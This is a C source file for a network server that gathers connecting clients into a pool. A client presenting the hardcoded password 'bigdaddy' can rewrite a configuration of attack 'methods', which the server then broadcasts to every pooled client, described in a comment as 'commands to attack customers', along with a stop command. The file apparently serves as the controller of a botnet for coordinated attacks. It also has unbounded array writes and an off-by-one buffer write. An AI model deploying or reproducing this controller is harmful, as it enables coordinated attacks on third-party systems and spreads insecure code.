#include "unp.h"
#include "daemon_init.h"
int main(int argc, char ** argv)
{
    int connfd, listenfd, size, i, n, counter = 0;

    struct sockaddr_in servAddr,clientAddr;
    char buffer[MAXLINE];
    char number[MAXLINE];
    FILE * pFile;

//    Call the daemon
//    daemon_init(argv[0],0);

    listenfd=Socket(AF_INET,SOCK_STREAM,0);
    bzero(&servAddr,sizeof(servAddr));
    servAddr.sin_family=AF_INET;
    servAddr.sin_port=htons(SERV_PORT);
    servAddr.sin_addr.s_addr=htonl(INADDR_ANY);

    Bind(listenfd,(SA *)&servAddr,sizeof(servAddr));
    Listen(listenfd,LISTENQ);
    printf("Loading Server...\n");
    struct sockaddr_in stackAddr[32];
    int descAddr[32];
    int portAddr[32];
    int j=0;

    // First phase
    // Filling of the pool of clients
    for(;;)
    {
        for(;;)
        {
            printf("\nWaiting connection...\n");

            // Authorization on the server
            socklen_t len=sizeof(clientAddr);
            connfd=Accept(listenfd,(SA *)&clientAddr,&len);
            printf("connection from %s:%d\n",
                   Inet_ntop(AF_INET,&clientAddr.sin_addr,buffer,sizeof(buffer)),
                   ntohs(clientAddr.sin_port));

            stackAddr[j]=clientAddr;
            size = Read(connfd,buffer, sizeof(buffer));
            buffer[size]='\0';
            printf("Client's port to send commands: %s\n",buffer);
            portAddr[j++]=atoi(buffer);
            size = Read(connfd,buffer, sizeof(buffer));
            buffer[size]='\0';
            printf("Received password: \"%s\"\n",buffer);
            if(!strcmp(buffer,"bigdaddy"))
            {
                printf("[ CORRECT ] Client is placed in the pool\n\n");
                strcpy(buffer,"[OK]");
                counter++;
                sprintf(number," %d",counter);
                strcat(buffer,number);
                Writen(connfd, buffer, strlen(buffer));

                // Reading response from admin client
                size = Read(connfd,buffer, sizeof(buffer));
                buffer[size]='\0';

                // Don't change the config
                if(!strcmp(buffer,"N"))
                {
                    printf("Current configuration file:\n");
                    pFile=fopen("config.txt","r");
                    if (pFile == NULL) perror ("Error opening file");
                    printf("-------------------------------------------------\n");
                    if ((n = fread(buffer,sizeof(char),1024,pFile)) > 0)
                    {
                        buffer[n] = '\0';
                        fputs (buffer, stdout);
                    }
                    printf("-------------------------------------------------\n\n");
                }
                // Change the config
                else
                {
                    pFile=fopen("config.txt","w+");
                    if (pFile == NULL) perror ("Error opening file");
                    printf("Get the new configuration file:\n");

                    // Save configuration file in the config.txt
                    Fputs(buffer, pFile);
                    fseek(pFile,0,SEEK_SET);
                    printf("-------------------------------------------------\n");
                    if ((n = fread(buffer,sizeof(char),1024,pFile)) > 0)
                    {
                        buffer[n] = '\0';
                        fputs (buffer, stdout);
                    }
                    printf("-------------------------------------------------\n\n");
                }
                fclose(pFile);
                // Move to the second phase
                break;
            }
            // Continue filling of the pool
            printf("[ WRONG ] Client is placed in the pool\n\n");
            strcpy(buffer,"[NO]");
            counter++;
            sprintf(number," %d",counter);
            strcat(buffer,number);
            Writen(connfd, buffer, strlen(buffer));
            Close(connfd);
        }

        // Second phase
        // Sending commands to attack customers
        sleep(1);
        printf("Connetction addresses:\n");
        for( i = 0; i < j; ++i )
            printf("[%d] %s:%d\n", i,
                   Inet_ntop(AF_INET,&stackAddr[i].sin_addr,buffer,sizeof(buffer)),
                   ntohs(portAddr[i]));

        // Read and send parameters of method
        int k;
        pFile=fopen("config.txt","r+");
        if (pFile == NULL) perror ("Error opening file");
        if ((n = fread(buffer,sizeof(char),1,pFile)) > 0)
            buffer[n] = '\0';
        sscanf(buffer,"%d",&k);
        for(i=0; i<k+1; ++i)
            fgets(buffer,MAXLINE,pFile);
        char * arg = strrchr(buffer,'\t');
        if ( arg == NULL)
            printf("Wrong parameters of method #%d\n",k);
        else
            printf("\n\033[33mPurpose:\033[0m\n\033[34mmethod #%d\n"
                   "%s\033[0m\n", k, arg+1);
        fclose(pFile);
        arg[strlen(arg)-1]='\0';
        sprintf(number,"%d",k);
        strcat(number," ");
        strcat(number,arg+1);
        strcat(number,"\0");

        // Sending commands
        for( i = 0; i < j; ++i )
        {
            descAddr[i]=Socket(AF_INET,SOCK_STREAM,0);
            stackAddr[i].sin_family=AF_INET;
            stackAddr[i].sin_port=htons(portAddr[i]);

            // Check of the clients
            if(connect(descAddr[i],(SA *)&stackAddr[i],sizeof(stackAddr[i])) < 0)
            {
                // If the client is offline
                printf("Address: %s:%d offline\n",
                       Inet_ntop(AF_INET,&stackAddr[i].sin_addr,buffer,sizeof(buffer)),
                       ntohs(stackAddr[i].sin_port));
                Close(descAddr[i]);
                // Replace clients which is offline
                int k=i;
                while(k!=j-1)
                {
                    stackAddr[k]=stackAddr[k+1];
                    portAddr[k]=portAddr[k+1];
                    k++;
                }
                i--;
                j--;
                counter--;
                continue;
            }
            // If the client is online
            printf("Address: %s:%d online\n",
                   Inet_ntop(AF_INET,&stackAddr[i].sin_addr,buffer,sizeof(buffer)),
                   ntohs(stackAddr[i].sin_port));
            Writen(descAddr[i],number,strlen(number)+1);
        }
        size = Read(connfd,buffer, sizeof(buffer));
        buffer[size]='\0';

        // Stop the process
        if(!strcmp(buffer,"stop"))
        {
            for( i = 0; i < j; ++i )
            {
                strcpy(buffer,"stop");
                Writen(descAddr[i],buffer,strlen(buffer));
                sleep(1);
                Close(descAddr[i]);
            }
        }
        Close(connfd);
        printf("\nCOMPLETED!\n");
    }
    return 0;
}

